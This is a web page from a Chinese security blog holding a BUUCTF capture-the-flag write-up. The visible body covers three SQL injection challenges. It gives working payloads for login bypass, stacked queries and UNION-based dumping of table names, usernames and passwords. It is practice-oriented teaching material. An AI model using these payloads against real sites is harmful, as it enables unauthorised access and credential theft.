<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>buuctf | Secfeng</title>
  <meta name="keywords" content=" buuctf ">
  <meta name="description" content="buuctf | Secfeng">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="一、含义​	客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端） 二、适用情况​	1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求 ​	2、目标机端口被占用 ​	3、目标机位于局域网 ​	4、IP会动态变化 ​	5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="反弹shell">
<meta property="og:url" content="http://example.com/2024/02/26/%E5%8F%8D%E5%BC%B9shell/index.html">
<meta property="og:site_name" content="Secfeng">
<meta property="og:description" content="一、含义​	客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端） 二、适用情况​	1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求 ​	2、目标机端口被占用 ​	3、目标机位于局域网 ​	4、IP会动态变化 ​	5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/02/26/%E5%8F%8D%E5%BC%B9shell/201908.png">
<meta property="og:image" content="http://example.com/2024/02/26/%E5%8F%8D%E5%BC%B9shell/202030.png">
<meta property="article:published_time" content="2024-02-26T11:29:53.000Z">
<meta property="article:modified_time" content="2024-02-26T13:33:47.640Z">
<meta property="article:author" content="Secfeng">
<meta property="article:tag" content="shell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/02/26/%E5%8F%8D%E5%BC%B9shell/201908.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 6.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>Secfeng</span>
</div>

<div class="icon">
    
        
    
        
            <a title="github"
               href="https://github.com/secfeng"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="全部文章">全部文章
            
                <small>(24)</small>
            
        </div>
    </li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">关于</a>
        
        <a style="width: 50%"
                
                                           class="friends">友链</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="24">
<input type="hidden" id="yelog_site_word_count" value="57.2k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">全部文章</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>0xGame</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件包含</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件上传</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>buuctf</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>laravel</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>misc</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Moectf</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>nodejs</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>php</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>rce</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>shell</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ssrf</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ssti</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xss</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xxe</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>yii</a>
            </li>
        
    </div>

</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        
        <a  class="全部文章 "
           href="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/"
           data-tag="shell"
           data-author="" >
            <span class="post-title" title="反弹shell">反弹shell</span>
            <span class="post-date" title="2024-02-26 19:29:53">2024/02/26</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2024/02/11/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
           data-tag="nodejs"
           data-author="" >
            <span class="post-title" title="原型链污染">原型链污染</span>
            <span class="post-date" title="2024-02-11 07:26:35">2024/02/11</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2024/01/17/nodejs(ctfshow)/"
           data-tag="nodejs"
           data-author="" >
            <span class="post-title" title="nodejs(ctfshow)">nodejs(ctfshow)</span>
            <span class="post-date" title="2024-01-17 16:59:51">2024/01/17</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/11/02/misc(ctfshow)/"
           data-tag="misc"
           data-author="" >
            <span class="post-title" title="misc(ctfshow)">misc(ctfshow)</span>
            <span class="post-date" title="2023-11-02 20:19:04">2023/11/02</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/10/04/Moectf-2023/"
           data-tag="Moectf"
           data-author="" >
            <span class="post-title" title="Moectf-2023">Moectf-2023</span>
            <span class="post-date" title="2023-10-04 16:54:20">2023/10/04</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/10/02/0xGame-2023/"
           data-tag="0xGame"
           data-author="" >
            <span class="post-title" title="0xGame-2023">0xGame-2023</span>
            <span class="post-date" title="2023-10-02 18:30:00">2023/10/02</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/09/26/NewStarCTF-2023/"
           data-tag="buuctf"
           data-author="" >
            <span class="post-title" title="NewStarCTF_2023">NewStarCTF_2023</span>
            <span class="post-date" title="2023-09-26 20:59:08">2023/09/26</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/08/23/ssrf(ctfshow)/"
           data-tag="ssrf"
           data-author="" >
            <span class="post-title" title="ssrf(ctfshow)">ssrf(ctfshow)</span>
            <span class="post-date" title="2023-08-23 09:32:37">2023/08/23</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/08/16/xss(ctfshow)/"
           data-tag="xss"
           data-author="" >
            <span class="post-title" title="xss(ctfshow)">xss(ctfshow)</span>
            <span class="post-date" title="2023-08-16 09:00:57">2023/08/16</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/08/03/buuctf/"
           data-tag="buuctf"
           data-author="" >
            <span class="post-title" title="buuctf">buuctf</span>
            <span class="post-date" title="2023-08-03 15:39:34">2023/08/03</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
           data-tag="ssti"
           data-author="" >
            <span class="post-title" title="SSTI模板注入">SSTI模板注入</span>
            <span class="post-date" title="2023-07-25 16:51:43">2023/07/25</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"
           data-tag="ssti"
           data-author="" >
            <span class="post-title" title="SSTI注入(ctfshow)">SSTI注入(ctfshow)</span>
            <span class="post-date" title="2023-07-25 16:30:32">2023/07/25</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/07/07/xxe(ctfshow)/"
           data-tag="xxe"
           data-author="" >
            <span class="post-title" title="xxe(ctfshow)">xxe(ctfshow)</span>
            <span class="post-date" title="2023-07-07 20:49:39">2023/07/07</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
           data-tag="laravel"
           data-author="" >
            <span class="post-title" title="laravel5.7反序列化漏洞复现">laravel5.7反序列化漏洞复现</span>
            <span class="post-date" title="2023-05-30 16:31:25">2023/05/30</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
           data-tag="yii"
           data-author="" >
            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
           data-tag="php"
           data-author="" >
            <span class="post-title" title="php反序列化">php反序列化</span>
            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
           data-tag="php"
           data-author="" >
            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
           data-tag="文件包含"
           data-author="" >
            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
           data-tag="文件上传"
           data-author="" >
            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
           data-tag="linux"
           data-author="" >
            <span class="post-title" title="linux学习">linux学习</span>
            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
           data-tag="rce"
           data-author="" >
            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
           data-tag="php"
           data-author="" >
            <span class="post-title" title="php伪协议">php伪协议</span>
            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
           data-tag="php"
           data-author="" >
            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
        </a>
        
        
        <a  class="全部文章 "
           href="/2023/03/28/xss/"
           data-tag="xss"
           data-author="" >
            <span class="post-title" title="xss">xss</span>
            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-buuctf" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">buuctf</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color2">buuctf</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            发布时间 : <time class="date" title='最后更新: 2024-01-21 21:05:34'>2023-08-03 15:39</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:13.2k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce"><span class="toc-text">命令执行(rce)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#a-x3D-x3D-md5-a%EF%BC%89"><span class="toc-text">$a&#x3D;&#x3D;md5($a）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-text">[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-text">**[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-text">[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7"><span class="toc-text">php特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-FlaskApp"><span class="toc-text">[GYCTF2020]FlaskApp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3-%E5%88%A9%E7%94%A8PIN%E7%A0%81%E8%BF%9B%E8%A1%8CRCE"><span class="toc-text">预期解 利用PIN码进行RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-text">非预期解</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B7%E6%9D%82"><span class="toc-text">混杂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-PYWebsite"><span class="toc-text">[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2019-Kookie"><span class="toc-text">[BSidesCF 2019]Kookie</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这道题测出来是单引号闭合，也没有上面过滤，直接用万能密码就能爆出flag</p>
<pre><code>payload ?username=admin&#39; or 1=1-- -&amp;password=admin
</code></pre>
<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>对查询点进行fuzz测试发现很多关键字都被过滤了</p>
<img src="/2023/08/03/buuctf/222647.png" class="">

<p>回包长度为500的都是可以正常使用的，这里;没有被过滤，尝试堆叠注入</p>
<p>首先show tables;</p>
<img src="/2023/08/03/buuctf/224429.png" class="">

<p>然后show columns from Flag;，不行，被过滤了。</p>
<p>参考别人wp <a target="_blank" rel="noopener" href="https://blog.csdn.net/StevenOnesir/article/details/110203051%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95">https://blog.csdn.net/StevenOnesir/article/details/110203051，有两种解法</a></p>
<p>解法1：</p>
<p>输入数字只回显1，输入字母啥也不回显，那么我们应该推出后端代码有 或 结构，而且不直接回显flag，但作为一道题目，from应该是from flag，所以猜测后端代码为：</p>
<pre><code>select $_POST[&#39;query&#39;] || flag from flag
</code></pre>
<p>所以payload就变的简单：</p>
<pre><code>*，1
</code></pre>
<p>这里，我们的语句变成了</p>
<pre><code>select *，1 from flag
</code></pre>
<p>select 1 的意思是建立一个临时列，这个列的列名为1，所有初始值都被设为1。</p>
<p>解法2：</p>
<p>通过修改SQL配置将或运算符||设置为连接符</p>
<pre><code>payload 1;set sql_mode=pipes_as_concat;select 1
</code></pre>
<p>要注意分号隔断了前面的命令，所以要再次添加select!!</p>
<p>上面的payload等同于</p>
<pre><code>select concat(1,flag) from Flag
</code></pre>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测出来username有注入点，用单引号闭合。</p>
<p>测数据库名</p>
<pre><code>username=-1&#39; union select 1,2,database()-- -&amp;password=admin
//库名为geek
</code></pre>
<p>测表名：</p>
<pre><code>username=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; -- -&amp;password=admin
//表名为geekuser,l0ve1ysq1
</code></pre>
<p>两个表里面都有id,uername,password</p>
<p>最终在l0ve1ysq1表里找到了flag</p>
<pre><code>username=-1&#39; union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)-- -&amp;password=admin
</code></pre>
